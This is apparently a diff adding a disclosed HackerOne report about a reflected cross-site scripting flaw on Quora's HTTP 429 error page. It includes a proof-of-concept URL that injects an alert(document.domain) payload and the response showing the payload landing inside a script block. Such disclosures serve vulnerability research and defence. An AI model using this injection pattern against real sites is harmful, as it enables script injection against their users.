@@ -1,0 +1,35 @@
+ReportLink:https://hackerone.com/reports/189768
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Quora(quora)
+BountyAmount:300.0
+Severity:medium
+State:Closed
+DateOfDisclosure:31.03.2017 19:35:43
+
+Summary:
+
+**Summary:**
+XSS on the error page when the user makes too many requests.
+
+### Steps To Reproduce
+
+1. Make a lot of requests to get the error 429
+2. Open PoC in FireFox
+
+```
+https://controlsyou.quora.com/'-alert(document.domain)-'
+``` 
+
+**HTTP Response**
+```
+<script type="text/javascript">
+...
+ga('set', 'dimension1', 'board-'-alert(document.domain)-'');
+ga('set', 'dimension2', 'False');
+ga('set', 'dimension3', 'False');});});</script>
+```
+
+
+### Optional: Your Environment (Browser version, Device, app version, os version etc)
+Tested on FireFox 50.0.2
